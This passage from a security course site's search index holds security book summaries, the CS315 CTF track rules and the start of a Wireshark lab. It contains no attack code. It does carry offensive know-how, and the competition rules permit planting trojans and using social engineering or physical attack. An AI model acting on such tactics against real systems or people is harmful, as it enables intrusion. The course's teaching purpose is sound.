network.</p>"},{"location":"Book/Network/Practical%20Packet%20Analysis/#cover","title":"Cover","text":""},{"location":"Book/Network/TCP%20IP%20Illustrated/","title":"TCP/IP Illustrated","text":"<p>Author: W. Richard Stevens  (Author)</p>"},{"location":"Book/Network/TCP%20IP%20Illustrated/#overview","title":"Overview","text":"<p>Finally, programmers that need to truly understand the TCP/IP protocol suite have a resource to turn to, TCP/IP Illustrated. Instead of merely describing the RFC's, bestselling author Rich Stevens takes an innovative \"visual\" approach which, combined with his writing style, results in an accessible \"understandable\" guide to TCP/IP.</p>"},{"location":"Book/Network/TCP%20IP%20Illustrated/#cover","title":"Cover","text":""},{"location":"Book/PWN/Core%20Principles%20of%20Reverse%20Engineering/","title":"Core Principles of Reverse Engineering","text":"<p>Author: [Han ] Lee Seung-won Publisher: People's Post and Telecommunications Publishing House Original Title: \ub9ac\ubc84\uc2f1 \ud575\uc2ec\uc6d0\ub9ac Translated by: Wu Chuanhai Publication Year: 2014-4-25 Pages: 679 Price: $109.00 Binding: Paperback Series: Turing Programming Series ISBN: 9787115350183</p> <p></p>"},{"location":"Book/PWN/Core%20Principles%20of%20Reverse%20Engineering/#introduction","title":"Introduction","text":"<p>This book provides a very detailed introduction to the core principles of code reversal analysis. The author has worked for many years at the Ahnlab Institute, and the book includes not only the extensive code he has written himself based on this experience, but also a variety of techniques and skills that reverse engineering researchers must understand. This book is a shortcut to the door of reverse engineering, where a thorough understanding and practical mastery of the technique can be extended to many IT-related fields.</p> <p>Readers who want to become reverse engineering researchers or developers who are working on reverse development will be greatly helped by this book. Also, those who want to become experts in the security field can easily start from this book.</p>"},{"location":"Book/PWN/Encryption%20and%20Decryption/","title":"Encryption and Decryption","text":"<p>Author: Duan Gang Publisher: Electronic Industry Press Publisher: Bowen Insights Year of publication: 2018-10-1 Pages: 936 Price: 198 Binding: Paperback Series: Security Technology Series ISBN: 9787121336928</p> <p></p>"},{"location":"Book/PWN/Encryption%20and%20Decryption/#introduction","title":"Introduction","text":"<p>Encryption and Decryption (4th Edition) takes encryption and decryption as the entry point and describes the basic knowledge and skills in the field of software security, such as debugging skills, reverse analysis, cryptographic protection, shell development, and virtual machine design. These knowledge are connected to each other, and readers can easily expand in the areas of vulnerability analysis, secure programming, virus analysis, and software protection after mastering these contents. From the perspective of employment, mastering the technologies related to encryption and decryption can improve one's competitive ability; from the perspective of personal growth, studying software security technologies helps to master some system underlying knowledge and is an important way to enhance professional skills. As a qualified programmer, besides mastering requirement analysis and design patterns, if you can master some knowledge of the underlying system and be familiar with the underlying structure of the whole system, you will benefit a lot in your work.</p> <p>Encryption and Decryption (4th Edition) is suitable for security researchers, software debuggers and program developers, and can also be used as a supplementary textbook for information security-related majors in universities.</p>"},{"location":"Book/PWN/Practical%20Malware%20Analysis/","title":"Practical Malware Analysis","text":"<p>\u4f5c\u8005: Michael Sikorski / Andrew Honig \u51fa\u7248\u793e: No Starch Press \u526f\u6807\u9898: The Hands-On Guide to Dissecting Malicious Software \u51fa\u7248\u5e74: 2012-2 \u9875\u6570: 760 \u5b9a\u4ef7: $ 67.74 ISBN: 9781593272906</p> <p></p>"},{"location":"Book/PWN/Practical%20Malware%20Analysis/#_1","title":"\u5185\u5bb9\u7b80\u4ecb","text":"<p>Malware analysis is big business, and attacks can cost a company dearly. When malware breaches your defenses, you need to act quickly to cure current infections and prevent future ones from occurring. For those who want to stay ahead of the latest malware, Practical Malware Analysis will teach you the tools and techniques used by professional analysts. With this book as your guide, you'll be able to safely analyze, debug, and disassemble any malicious software that comes your way. You'll learn how to: * Set up a safe virtual environment to analyze malware * Quickly extract network signatures and host-based indicators * Use key analysis tools like IDA Pro, OllyDbg, and WinDbg * Overcome malware tricks like obfuscation, anti-disassembly, anti-debugging, and anti-virtual machine techniques * Use your newfound knowledge of Windows internals for malware analysis * Develop a methodology for unpacking malware and get practical experience with five of the most popular packers * Analyze special cases of malware with shellcode, C++, and 64-bit code Hands-on labs throughout the book challenge you to practice and synthesize your skills as you dissect real malware samples, and pages of detailed dissections offer an over-the-shoulder look at how the pros do it. You'll learn how to crack open malware to see how it really works, determine what damage it has done, thoroughly clean your network, and ensure that the malware never comes back. Malware analysis is a cat-and-mouse game with rules that are constantly changing, so make sure you have the fundamentals. Whether you're tasked with securing one network or a thousand networks, or you're making a living as a malware analyst, you'll find what you need to succeed in Practical Malware Analysis.</p>"},{"location":"Book/PWN/Practical%20Malware%20Analysis/#_2","title":"\u76ee\u5f55","text":"<p>Introduction Chapter 0: Malware Analysis Primer Part 1: Basic Analysis Chapter 1: Basic Static Techniques Chapter 2: Malware Analysis in Virtual Machines Chapter 3: Basic Dynamic Analysis Part 2: Advanced Static Analysis Chapter 4: A Crash Course in x86 Disassembly Chapter 5: IDA Pro Chapter 6: Recognizing C Code Constructs in Assembly Chapter 7: Analyzing Malicious Windows Programs Part 3: Advanced Dynamic Analysis Chapter 8: Debugging Chapter 9: OllyDbg Chapter 10: Kernel Debugging with WinDbg Part 4: Malware Functionality Chapter 11: Malware Behavior Chapter 12: Covert Malware Launching Chapter 13: Data Encoding Chapter 14: Malware-Focused Network Signatures Part 5: Anti-Reverse-Engineering Chapter 15: Anti-Disassembly Chapter 16: Anti-Debugging Chapter 17: Anti-Virtual Machine Techniques Chapter 18: Packers and Unpacking Part 6: Special Topics Chapter 19: Shellcode Analysis Chapter 20: C++ Analysis Chapter 21: 64-Bit Malware Appendix A: Important Windows Functions Appendix B: Tools for Malware Analysis Appendix C: Solutions to Labs</p>"},{"location":"Book/Programming/C/C%20Primer%20Plus/","title":"C Primer Plus (Developer's Library)","text":"<p>by Stephen Prata (Author)</p>"},{"location":"Book/Programming/C/C%20Primer%20Plus/#introduction","title":"Introduction","text":"<p>C Primer Plus is a carefully tested, well-crafted, and complete tutorial on a subject core to programmers and developers. This computer science classic teaches principles of programming, including structured code and top-down design.</p> <p>Author and educator Stephen Prata has created an introduction to C that is instructive, clear, and insightful. Fundamental programming concepts are explained along with details of the C language. Many short, practical examples illustrate just one or two concepts at a time, encouraging readers to master new topics by immediately putting them to use.</p> <p>Review questions and programming exercises at the end of each chapter bring out the most critical pieces of information and help readers understand and digest the most difficult concepts. A friendly and easy-to-use self-study guide, this book is appropriate for serious students of programming, as well as developers proficient in other languages with a desire to better understand the fundamentals of this core language.</p> <p>The sixth edition of this book has been updated and expanded to cover the latest developments in C as well as to take a detailed look at the new C11 standard. In C Primer Plus you\u2019ll find depth, breadth, and a variety of teaching techniques and tools to enhance your learning:</p> <ul> <li>Complete, integrated discussion of both C language fundamentals and additional features</li> <li>Clear guidance about when and why to use different parts of the language</li> <li>Hands-on learning with concise and simple examples that develop your understanding of a concept or two at a time</li> <li>Hundreds of practical sample programs</li> <li>Review questions and programming exercises at the end of each chapter to test your understanding</li> <li>Coverage of generic C to give you the greatest flexibility</li> </ul>"},{"location":"Book/Programming/C/C%20Primer%20Plus/#cover","title":"Cover","text":""},{"location":"Book/Programming/C/C%20Programming%20Language/","title":"C Programming Language, 2nd Edition","text":"<p>by Brian W. Kernighan (Author), Dennis M. Ritchie (Author)</p>"},{"location":"Book/Programming/C/C%20Programming%20Language/#introduction","title":"Introduction","text":"<p>The authors present the complete guide to ANSI standard C language programming. Written by the developers of C, this new version helps readers keep up with the finalized ANSI standard for C while showing how to take advantage of C's rich set of operators, economy of expression, improved control flow, and data structures. The 2/E has been completely rewritten with additional examples and problem sets to clarify the implementation of difficult language constructs. For years, C programmers have let K&amp;R guide them to building well-structured and efficient programs. Now this same help is available to those working with ANSI compilers. Includes detailed coverage of the C language plus the official C language reference manual for at-a-glance help with syntax notation, declarations, ANSI changes, scope rules, and the list goes on and on.</p>"},{"location":"Book/Programming/C/C%20Programming%20Language/#cover","title":"Cover","text":""},{"location":"Book/Programming/C/C%20Traps%20and%20Pitfalls/","title":"C Traps and Pitfalls","text":"<p>by Andrew Koenig (Author)</p>"},{"location":"Book/Programming/C/C%20Traps%20and%20Pitfalls/#introduction","title":"Introduction","text":"<p>Even C experts come across problems that require days of debugging to fix. This book helps to prevent such problems by showing how C programmers get themselves into trouble. Each of the book's many examples has trapped a professional programmer.</p>"},{"location":"Book/Programming/C/C%20Traps%20and%20Pitfalls/#cover","title":"Cover","text":""},{"location":"Book/Programming/C/Expert%20C%20Programming%20Deep%20C%20Secrets/","title":"Expert C Programming: Deep C Secrets","text":"<p>by Peter van der Linden (Author)</p>"},{"location":"Book/Programming/C/Expert%20C%20Programming%20Deep%20C%20Secrets/#introduction","title":"Introduction","text":"<p>This book is for the knowledgeable C programmer, this is a second book that gives the C programmers advanced tips and tricks. This book will help the C programmer reach new heights as a professional. Organized to make it easy for the reader to scan to sections that are relevant to their immediate needs.</p>"},{"location":"Book/Programming/C/Expert%20C%20Programming%20Deep%20C%20Secrets/#cover","title":"Cover","text":""},{"location":"Book/Programming/C/Pointers%20on%20C/","title":"Pointers on C","text":"<p>by Kenneth Reek (Author)</p>"},{"location":"Book/Programming/C/Pointers%20on%20C/#introduction","title":"Introduction","text":"<p>Designed for professionals and advanced students, Pointers On C provides a comprehensive resource for those needing in-depth coverage of the C programming language. An extensive explanation of pointer basics and a thorough exploration of their advanced features allows programmers to incorporate the power of pointers into their C programs. Complete coverage, detailed explanations of C programming idioms, and thorough discussion of advanced topics makes Pointers On C a valuable tutorial and reference for students and professionals alike.</p>"},{"location":"Book/Programming/C/Pointers%20on%20C/#cover","title":"Cover","text":""},{"location":"Book/Programming/C%2B%2B/C%2B%2B%20Primer%20Plus/","title":"C++ Primer Plus","text":"<p>by Stephen Prata (Author)</p>"},{"location":"Book/Programming/C%2B%2B/C%2B%2B%20Primer%20Plus/#introduction","title":"Introduction","text":"<p>C++ Primer Plus, Sixth Edition</p> <p>New C++11 Coverage</p> <p>C++ Primer Plus is a carefully crafted, complete tutorial on one of the most significant and widely used programming languages today. An accessible and easy-to-use self-study guide, this book is appropriate for both serious students of programming as well as developers already proficient in other languages.</p> <p>The sixth edition of C++ Primer Plus has been updated and expanded to cover the latest developments in C++, including a detailed look at the new C++11 standard.</p> <p>Author and educator Stephen Prata has created an introduction to C++ that is instructive, clear, and insightful. Fundamental programming concepts are explained along with details of the C++ language. Many short, practical examples illustrate just one or two concepts at a time, encouraging readers to master new topics by immediately putting them to use.</p> <p>Review questions and programming exercises at the end of each chapter help readers zero in on the most critical information and digest the most difficult concepts.</p> <p>In C++ Primer Plus, you\u2019ll find depth, breadth, and a variety of teaching techniques and tools to enhance your learning:</p> <ul> <li>A new detailed chapter on the changes and additional capabilities introduced in the C++11 standard</li> <li>Complete, integrated discussion of both basic C language and additional C++ features</li> <li>Clear guidance about when and why to use a feature</li> <li>Hands-on learning with concise and simple examples that develop your understanding a concept or two at a time</li> <li>Hundreds of practical sample programs</li> <li>Review questions and programming exercises at the end of each chapter to test your understanding</li> <li>Coverage of generic C++ gives you the greatest possible flexibility</li> <li>Teaches the ISO standard, including discussions of templates, the Standard Template Library, the string class, exceptions, RTTI, and namespaces</li> </ul> <p>Table of Contents</p> <p>1: Getting Started with C++</p> <p>2: Setting Out to C++</p> <p>3: Dealing with Data</p> <p>4: Compound Types</p> <p>5: Loops and Relational Expressions</p> <p>6: Branching Statements and Logical Operators</p> <p>7: Functions: C++\u2019s Programming Modules</p> <p>8: Adventures in Functions</p> <p>9: Memory Models and Namespaces</p> <p>10: Objects and Classes</p> <p>11: Working with Classes</p> <p>12: Classes and Dynamic Memory Allocation</p> <p>13: Class Inheritance</p> <p>14: Reusing Code in C++</p> <p>15: Friends, Exceptions, and More</p> <p>16: The string Class and the Standard Template Library</p> <p>17: Input, Output, and Files</p> <p>18: The New C++11 Standard</p> <p>A Number Bases</p> <p>B C++ Reserved Words</p> <p>C The ASCII Character Set</p> <p>D Operator Precedence</p> <p>E Other Operators</p> <p>F The stringTemplate Class</p> <p>G The Standard Template Library Methods and Functions</p> <p>H Selected Readings and Internet Resources</p> <p>I Converting to ISO Standard C++</p> <p>J Answers to Chapter Reviews</p>"},{"location":"Book/Programming/C%2B%2B/C%2B%2B%20Primer%20Plus/#cover","title":"Cover","text":""},{"location":"Book/Programming/C%2B%2B/C%2B%2B%20Primer/","title":"C++ Primer","text":"<p>by Stanley Lippman (Author), Jos\u00e9e Lajoie (Author), Barbara Moo (Author)</p>"},{"location":"Book/Programming/C%2B%2B/C%2B%2B%20Primer/#introduction","title":"Introduction","text":"<p>Bestselling Programming Tutorial and Reference Completely Rewritten for the New C11 Standard Fully updated and recast for the newly released C11 standard this authoritative and comprehensive introduction to C will help you to learn the language fast and to use it in modern highly effective ways Highlighting todays best practices the authors show how to use both the core language and its standard library to write efficient readable and powerful code C Primer Fifth Edition introduces the C standard library from the outset drawing on its common functions and facilities to help you write useful programs without first having to master every language detail The books many examples have been revised to use the new language features and demonstrate how to make the best use of them This book is a proven tutorial for those new to C an authoritative discussion of core C concepts and techniques and a valuable resource for experienced programmers especially those eager to see C11 enhancements illuminated Start Fast and Achieve MoreLearn how to use the new C11 language features and the standard library to build robust programs quickly and get comfortable with high-level programming Learn through examples that illuminate todays best coding styles and program design techniques Understand the rationale behind the rules why C11 works as it does Use the extensive crossreferences to help you connect related concepts and insights Benefit from up-to-date learning aids and exercises that emphasize key points help you to avoid pitfalls promote good practices and reinforce what youve learned Access the source code for the extended examples from informit comtitle0321714113 C Primer Fifth Edition features an enhanced layflat binding which allows the book to stay open more easily when placed on a flat surface This special binding method-notable by a small space inside the spine-also increases durability</p>"},{"location":"Book/Programming/C%2B%2B/C%2B%2B%20Primer/#cover","title":"Cover","text":""},{"location":"Book/Security/0day%20Security/","title":"0day Security: Software Vulnerability Analysis Techniques","text":"<p>Author: Wang Qing</p>"},{"location":"Book/Security/0day%20Security/#introduction","title":"Introduction","text":"<p>Oday Security: Software Vulnerability Analysis Techniques (2nd Edition), edited by Qing Wang, is divided into five chapters, which systematically and comprehensively introduce the analysis, detection and protection of buffer overflow vulnerabilities in Windows platform. The first chapter is the basic theory and primary technology of vulnerability exploit, which can lead readers to get started quickly; the second chapter, on the basis of the first chapter, combines the cutting-edge achievements of relevant researchers at home and abroad, and summarizes the vulnerability technology from two aspects of attack and defense; the third chapter, from the perspective of security testers, discusses the vulnerability mining methods and ideas of several types of commonly used software; the fourth chapter fills the role of this type of book in The fourth chapter fills the technical gap in the mysterious field of Windows kernel security and related attack and defense knowledge; the fifth chapter uses a large number of Oday case studies to help readers understand the various ideas and methods in the first four chapters. Oday Security: Software Vulnerability Analysis Techniques (2nd Edition) can be used as a reference guide for network security practitioners and hacker enthusiasts, or as a guide for graduate or undergraduate students in network security.</p>"},{"location":"Book/Security/0day%20Security/#cover","title":"Cover","text":""},{"location":"Book/Security/A%20Guide%20to%20Kernel%20Exploitation/","title":"A Guide to Kernel Exploitation: Attacking the Core","text":"<p>Author: Enrico Perla B.Sc. Computer Science University of Torino M.Sc. Computer Science Trinity College Dublin (Author), Massimiliano Oldani (Author)</p>"},{"location":"Book/Security/A%20Guide%20to%20Kernel%20Exploitation/#introduction","title":"Introduction","text":"<p>A Guide to Kernel Exploitation: Attacking the Core discusses the theoretical techniques and approaches needed to develop reliable and effective kernel-level exploits, and applies them to different operating systems, namely, UNIX derivatives, Mac OS X, and Windows. Concepts and tactics are presented categorically so that even when a specifically detailed vulnerability has been patched, the foundational information provided will help hackers in writing a newer, better attack; or help pen testers, auditors, and the like develop a more concrete design and defensive structure. The book is organized into four parts. Part I introduces the kernel and sets out the theoretical basis on which to build the rest of the book. Part II focuses on different operating systems and describes exploits for them that target various bug classes. Part III on remote kernel exploitation analyzes the effects of the remote scenario and presents new techniques to target remote issues. It includes a step-by-step analysis of the development of a reliable, one-shot, remote exploit for a real vulnerability a bug affecting the SCTP subsystem found in the Linux kernel. Finally, Part IV wraps up the analysis on kernel exploitation and looks at what the future may hold.</p>"},{"location":"Book/Security/A%20Guide%20to%20Kernel%20Exploitation/#cover","title":"Cover","text":""},{"location":"Book/Security/Fuzzing%20for%20Software%20Security%20Testing%20and%20Quality%20Assurance/","title":"Fuzzing for Software Security Testing and Quality Assurance (Artech House Information Security and Privacy)","text":"<p>Author: Ari Takanen  (Author), Jared D. Demott (Contributor), Charles Miller (Contributor)</p>"},{"location":"Book/Security/Fuzzing%20for%20Software%20Security%20Testing%20and%20Quality%20Assurance/#introduction","title":"Introduction","text":"<p>Learn the code cracker's malicious mindset, so you can find worn-size holes in the software you are designing, testing, and building. Fuzzing for Software Security Testing and Quality Assurance takes a weapon from the black-hat arsenal to give you a powerful new tool to build secure, high-quality software. This practical resource helps you add extra protection without adding expense or time to already tight schedules and budgets. The book shows you how to make fuzzing a standard practice that integrates seamlessly with all development activities. This comprehensive reference goes through each phase of software development and points out where testing and auditing can tighten security. It surveys all popular commercial fuzzing tools and explains how to select the right one for a software development project. The book also identifies those cases where commercial tools fall short and when there is a need for building your own fuzzing tools.</p>"},{"location":"Book/Security/Fuzzing%20for%20Software%20Security%20Testing%20and%20Quality%20Assurance/#cover","title":"Cover","text":""},{"location":"Book/Security/Gray%20Hat%20Hacking/","title":"Gray Hat Hacking The Ethical Hackers Handbook","text":"<p>Author: Allen Harper (Author), Shon Harris  (Author), Jonathan Ness (Author), Chris Eagle (Author), Gideon Lenkey (Author), Terron Williams (Author)</p>"},{"location":"Book/Security/Gray%20Hat%20Hacking/#introduction","title":"Introduction","text":"<p>THE LATEST STRATEGIES FOR UNCOVERING TODAY'S MOST DEVASTATING ATTACKS Thwart malicious network intrusion by using cutting-edge techniques for finding and fixing security flaws. Fully updated and expanded with nine new chapters, Gray Hat Hacking: The Ethical Hacker's Handbook, Third Edition details the most recent vulnerabilities and remedies along with legal disclosure methods. Learn from the experts how hackers target systems, defeat production schemes, write malicious code, and exploit flaws in Windows and Linux systems. Malware analysis, penetration testing, SCADA, VoIP, and Web security are also covered in this comprehensive resource. Develop and launch exploits using BackTrack and Metasploit Employ physical, social engineering, and insider attack techniques Build Perl, Python, and Ruby scripts that initiate stack buffer overflows Understand and prevent malicious content in Adobe, Office, and multimedia files Detect and block client-s</p>"},{"location":"Book/Security/Gray%20Hat%20Hacking/#cover","title":"Cover","text":""},{"location":"Book/Security/Rootkit/","title":"The Rootkit Arsenal: Escape and Evasion: Escape and Evasion in the Dark Corners of the System","text":"<p>Author: Bill Blunden  (Author)</p>"},{"location":"Book/Security/Rootkit/#introduction","title":"Introduction","text":"<p>This book demonstrates how to modify a system at runtime to subvert a forensic live response. Readers will learn how to conceal their presence on a server, disable its security policies, sidestep group policy, maintain remote access, and covertly monitor system activity--all with the system administrator being none the wiser.</p>"},{"location":"Book/Security/Rootkit/#cover","title":"Cover","text":""},{"location":"Book/Security/Vulnerability%20War/","title":"Vulnerability War: Software Vulnerability Analysis in a Nutshell","text":"<p>Author: \u6797\u6860\u6cc9</p>"},{"location":"Book/Security/Vulnerability%20War/#introduction","title":"Introduction","text":"<p>Vulnerability War: Essentials of Software Vulnerability Analysis\" systematically explains various tools, theoretical techniques and practical methods for software vulnerability analysis and exploitation, mainly for Windows and Android platforms. Vulnerability War: Software Vulnerability Analysis Essentials is divided into different types of software vulnerabilities, such as stack overflow, sandbox escape, type obfuscation, UAF, kernel vulnerabilities, etc. It also includes the analysis and exploitation of vulnerabilities on Android platform for the current popular mobile security. Taking carefully selected classic vulnerabilities as examples, we share the analysis techniques and tools of vulnerabilities, and explain in detail the causes, exploitation and repair methods of these vulnerabilities, aiming to \"teach to fish\". The most important feature of \"Vulnerability War: Software Vulnerability Analysis Essentials\" is that it uses various types of classical vulnerabilities as practical explanations, abandoning empty-headed theories, and is almost \"a book written with a debugger\".</p> <p>Vulnerability War: Software Vulnerability Analysis Essentials is suitable for undergraduate and graduate students in computer-related fields, information security enthusiasts, software security and mobile security-related security practitioners, software developers and testers, hackers, etc.</p>"},{"location":"Book/Security/Vulnerability%20War/#cover","title":"Cover","text":""},{"location":"CS315/Introduction/","title":"CS315 CTF Track","text":"Topics Grade Class Participation 40 Lab 1: Packet Sniffing and Wireshark 60+10 Lab 2: Secure Coding and Buffer Overflows 60+10 Lab 3: Secure Coding and Format-String Vulnerability 60+10 Lab 4: Scanning, Reconnaissance, and Penetration Testing 60+10 Lab 5: Reverse Engineering and Obfuscation 60+10 Lab 6: IoT Security and Wireless Exploitation 60+10 Lab 7: Nailgun Attack 60+10 Lab 8: Nailgun Defense 60+10 Lab 9: Dirty COW Attack 60+10 Lab 10: RSA Public-Key Encryption and Signature 60+10 Lab 11: Web Security 60+10 Lab 12: Return-to-libc &amp; Return Oriented Programming 60+10 Attack-Defense CTF 120 Total 1000 <p>The lab submission is the same as the Lab track, while CTF has 240 points in total. 120 points of challenges &amp; virtual machine penetration, and 120 points of AWD CTF.</p> <p>Let's introduce something about the CTF track.</p>"},{"location":"CS315/Introduction/#overview","title":"Overview","text":"<p>CTF majors in the practice part of computer security. CTF (Capture the flag) is one kind of cybersecurity game for hacking and penetration testing. In the real world hacking is illegal and dangerous, while some developers found a new type of game: establish a target box, and try to attack it.</p> <p>In the CTF track, our mission is to solve some simulation challenges and try to grab the top-secret <code>flag</code> from the box. We would have several challenges or virtual machine boxes every week, our goal is to find a vulnerability and use it to achieve some objectives:</p> <ol> <li>Run arbitrary code from remote (RCE).</li> <li>Privilege escalation.</li> <li>Reveal secret information (flag).</li> </ol> <p>The ability we need to learn in this track is the real-world hacking methodology. We not only need to solve some CTF challenges that focus on specific vulnerabilities but also a from-zero-to-root hacking using a well-designed target virtual machine. At the end of this semester, we also need to run an Attack-with-Defense competition, in which every player attacks others and fixes their vulnerabilities.</p> <p>The learning involves:</p> <ul> <li>Find the correct information from the Internet.</li> <li>Utilize exploits and launch a cybersecurity attack in practice.</li> <li>How to patch a vulnerability.</li> <li>Contribute to real-world cybersecurity, and earn some tips from bug bounty.</li> </ul> <p>Be careful, CS315 is NOT easy. We need a lot of computer science knowledge to run a simple attack. Please make sure you have the following requirements:</p> <ul> <li>Linux usage and compilation from source code.</li> <li>Network protocol basics.</li> <li>Programming with any language.</li> </ul>"},{"location":"CS315/Introduction/#submission","title":"Submission","text":"<p>We would have 3 types of assignments. During the CTF track, we would use a CTF platform as a practice environment and submission check.</p> <p>Inside the university: http://detroit.sustech.edu.cn/</p> <p>Through public Internet: http://116.7.234.225/</p>"},{"location":"CS315/Introduction/#ctf-challenge","title":"CTF Challenge","text":"<pre><code>Example:\ntry to find the plain text of this cipher text.\niodj{brx'uh_zhofrph_wr_wkh_fv315!}\nSolution:\nUse Caesar cipher, left rotate move every letter, and find the correct plain text.\nflag{you're_welcome_to_the_cs315!}\n</code></pre> <p>The challenge is not a fully functional service. We can focus on the specific part of the real-world vulnerability. The final mission of the CTF challenge is to find a special string that starts with <code>flag</code> or <code>cs315</code>.</p> <p>Submit this string to the challenge platform.</p> <p>However, the assignment we need to submit on the blackboard is not only the flag, we also need to post a <code>writeup</code> for this challenge. Simply, a <code>writeup</code> is the step to solve the challenge. Just like mathematics questions, write some steps instead of only the result.</p>"},{"location":"CS315/Introduction/#virtual-machine-box","title":"Virtual Machine Box","text":"<p>A virtual machine box is a <code>.iso</code> file that contains some websites or services. We first know nothing about the target box. Usually, a virtual machine box contains a real-world-like service, for example, a blog, or an online shopping platform.</p> <p>We need to retrieve the <code>root</code> privilege in this box, each step we would get a <code>flag</code> as a step mark.</p> <ol> <li>Scan the local IP and find the address of the virtual machine.</li> <li>Information gathering and finding the open services running on the VM.</li> <li>Attack the vulnerable service and get user access to the SSH service.</li> <li>Privilege escalation to get root sid.</li> </ol> <p>We would have 2 virtual machine box hacking in the 4th week and 8th week.</p>"},{"location":"CS315/Introduction/#attack-with-defense","title":"Attack-with-Defense","text":"<p>The final exam for the CTF track is the AWD game with all CTF track players. Attack-with-Defense requires everyone to have a server, several services are running on the server. All the players need to keep the services running, fix the vulnerabilities in the service, and attack others' servers.</p> <p>Every method is allowed.</p> <ul> <li>Left a trojan on others' servers.</li> <li>Deploy an EDR on the self server.</li> <li>Sniffing the network to capture payload or flag.</li> <li>Use honey pot.</li> <li>Social engineering or physical attack.</li> </ul> <p>This game would need us to team up. Each team has 4 members, who work together to win the game.</p>"},{"location":"CS315/Introduction/#grade","title":"Grade","text":"<p>The grading system we use would try to eliminate the possibility of the rat race. Attitude is no substitute for competence. The weekly challenges and virtual machines have a maximum score of 10, while the final AWD game doesn't have a maximum score, which means you can get as many as possible points in this game.</p> <p>For the weekly challenge, we have 3 challenges every week:</p> <ul> <li>One easy challenge, can be solved using lecture &amp; lab knowledge. - 5 points.</li> <li>One medium challenge, can be solved after some searching and reading of extra materials (textbook). - 5 points.</li> <li>One hard / very hard challenge, for real hackers and experts. - a bonus for the AWD game.</li> </ul> <p>Let's explain the bonus challenge. The grading system for the AWD game is a log function:</p> <p>score = (log_1.2(x))^(1+y/100)</p> <p>x stands for the final points you earn in the AWD, usually, a team has 50,000 initial points, through attacking and defending, you can earn points from others or lose points from others' attacks.</p> <p>For a tuneful network, without any cybersecurity attacks, every team would get 60 points out of 120 points. However, if a team can earn 1,000,000 points, this team can have 75 points out of 120 points.</p> <p>Quite a few, right?</p> <p>But this isn't the final grade, let's talk about the <code>y</code> in the exponent. This variable stands for the bonus challenges the team solves in the semester. Each bonus challenge can have 1 bonus points, which gives <code>y</code> some bonus. For a 4-member team, if several members have the same bonus challenge solved, the <code>y</code> won't be calculated twice (still the same as the bonus points for this challenge).</p> <p>The maximum <code>y</code> value would be around 20.</p> <p>For example, Frankss solved 6 out of 20 bonus challenges, while Monad solved 7 out of 20 bonus challenges, and they have 3 common solutions to the same challenge. The bonus <code>y</code> value would be 10.</p> <p>If a team has all bonus points 20, they can have 120 points (maximum) in the AWD with only 19,000 AWD points.</p> <p>Be aware, that this grading system is only for the elimination of the rat race. I hope everyone can learn about cybersecurity, instead of becoming a script kid.</p>"},{"location":"CS315/Introduction/#extra-bonus","title":"Extra Bonus","text":"<p>Just like the research track's special rule, if you successfully submitted a paper, the research track would give bonus points. In the CTF track, we can have some similar methods to win the bonus.</p> <ul> <li>Join a province-level or higher CTF competition and qualified for the final round, and win at least a prize.</li> <li>Win a prize from bug bounty.</li> <li>Discover or patch some vulnerabilities, get a CVE / CNNVD number (please don't submit useless vulnerabilities, the goal is to contribute to the cybersecurity, not the CVE itself).</li> <li> <p>Have participated in the DEF CON final.</p> </li> <li> <p>Any other contribution to real-world security.</p> </li> </ul>"},{"location":"CS315/Introduction/#textbook","title":"Textbook","text":"<p>I would reference this book from the Nu1L team:</p> <p>\u4ece0\u52301\uff1aCTFer\u6210\u957f\u4e4b\u8def</p> <p>For the English version, we can reference these wiki:</p> <p>https://wiki.compass.college/</p> <p>https://teambi0s.gitlab.io/bi0s-wiki/</p>"},{"location":"CS315/Introduction/#environment","title":"Environment","text":"<p>If you want to use some virtual machine as a penetration environment, instead of your physical computer, there are some great distributions:</p> <ul> <li>Kali Linux: https://www.kali.org/</li> <li>Black Arch Linux: https://blackarch.org/</li> <li>Windows 10: https://github.com/makoto56/penetration-suite-toolkit</li> </ul>"},{"location":"CS315/Lab%201%20Packet%20Sniffing%20and%20Wireshark/","title":"Lab 1: Packet Sniffing and Wireshark","text":"<p>In reality, e-discovery (digital forensics) is the process of obtaining, preserving, analyzing and presenting evidence of computer intrusion, sabotage, fraud, attack and other crimes in a manner consistent with legal norms by using computer software and hardware technologies. The forensics-related topics in CTF are the process of obtaining the flags placed by the questioner by analyzing the files containing relevant records and traces, such as traffic packets, log files, disk memory images, etc. Forensics-related topics are characterized by a large amount of information, and it may take a very long time to analyze them one by one, so it is essential to master efficient analysis methods.</p> <p>This section will introduce three common forensic scenarios in CTF, namely traffic analysis, memory image forensics and disk image forensics, the reader needs to master the pre-requisite knowledge including computer network basics, file system basics and operating system basics.</p>"},{"location":"CS315/Lab%201%20Packet%20Sniffing%20and%20Wireshark/#traffic-analysis","title":"Traffic Analysis","text":""},{"location":"CS315/Lab%201%20Packet%20Sniffing%20and%20Wireshark/#wireshark-and-tshark","title":"Wireshark and Tshark","text":"<p>A traffic packet is generally a traffic file in PCAP format obtained by traffic crawling of a network device on a computer using tools such as tcpdump. The graphical tool Wireshark and its command line tool Tshark can analyze such traffic packets. Wireshark is free software (official website is https://www.wireshark.org/) and supports the analysis of multiple protocols and also supports the traffic capture function.</p> <p>The interface of Wireshark is shown in Figure 9-3-1. After loading the traffic packet you can see the network traffic, protocols and status are distinguished by color, click on a traffic to see the details of the traffic. Enter the filter expression in the filter field to filter the traffic and see the required network traffic. If you want to filter network traffic for the FTP protocol, enter the FTP expression to see the results (see Figure 9-3-2).</p> <p></p> <p></p> <p>Tshark is a command-line tool for Wireshark. Wireshark builds the metadata of traffic packets in memory, so Tshark is useful for analyzing huge traffic packets and can significantly improve performance. Tshark's command-line parameters are very complex, and the details of how to use them can be found at https://www.wireshark.org/ docs/man-pages/tshark.html for details. An example of filtering FTP protocols in the same traffic packets as the previous section is shown in Figure 9-3-3.</p> <p></p>"},{"location":"CS315/Lab%201%20Packet%20Sniffing%20and%20Wireshark/#traffic-analysis-common-operations","title":"Traffic analysis common operations","text":"<p>Wireshark's \"Statistics\" menu allows you to view the general status of traffic packets, such as which protocols are included, which IP addresses are involved in the session, and so on. Figure 9-3-4 and Figure 9-3-5 show the protocol hierarchy statistics and session statistics, respectively. These two functions can help us quickly locate the point that needs to be analyzed, because the traffic analysis in CTF often has a lot of interference traffic, and the traffic required by the questioner is usually obtained in the LAN or a specific few hosts, by viewing the traffic information can greatly save the time to find the traffic that needs to be analyzed.</p> <p></p> <p></p> <p>The most widely used transport layer protocol in computer networks is TCP, which is a connection-oriented protocol that allows both transmitting parties to ensure transparent transmission and only care about the data they get. However, in the actual transmission process, TCP traffic can be sliced into many small datagrams due to the MTU, making it inconvenient to analyze. To address this situation, Wireshark provides the ability to 